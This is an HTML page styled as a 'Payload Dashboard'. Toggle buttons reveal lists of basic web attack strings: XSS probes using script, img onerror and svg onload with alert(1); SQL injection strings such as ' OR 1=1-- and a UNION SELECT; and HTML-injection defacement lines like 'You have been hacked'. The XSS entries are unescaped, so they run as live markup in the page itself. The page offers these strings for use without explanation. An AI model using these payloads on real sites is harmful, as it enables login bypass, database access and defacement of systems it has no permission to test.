<!DOCTYPE html>
<html>
<head>
    <title>Payloads Dashboard</title>
    <style>
        body { font-family: Arial; background: #111; color: #fff; padding: 20px; }
        h2 { color: #00ffcc; }
        .box { margin: 15px 0; padding: 15px; background: #222; border-radius: 10px; }
        button { padding: 10px; margin-bottom: 10px; cursor: pointer; }
        pre { display: none; background: black; padding: 10px; }
    </style>
</head>
<body>

<h1>💣 Payload Dashboard</h1>

<div class="box">
    <button onclick="toggle('xss')">🔍 Show XSS Payloads</button>
    <pre id="xss">
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
    </pre>
</div>

<div class="box">
    <button onclick="toggle('sqli')">💉 Show SQLi Payloads</button>
    <pre id="sqli">
' OR 1=1--
admin' --
' UNION SELECT NULL,NULL--
    </pre>
</div>

<div class="box">
    <button onclick="toggle('html')">🧪 Show HTML Payloads</button>
    <pre id="html">
<h1>Hacked</h1>
<marquee>You have been hacked</marquee>
    </pre>
</div>

<script>
function toggle(id){
    let el = document.getElementById(id);
    el.style.display = el.style.display === "block" ? "none" : "block";
}
</script>

</body>
</html>
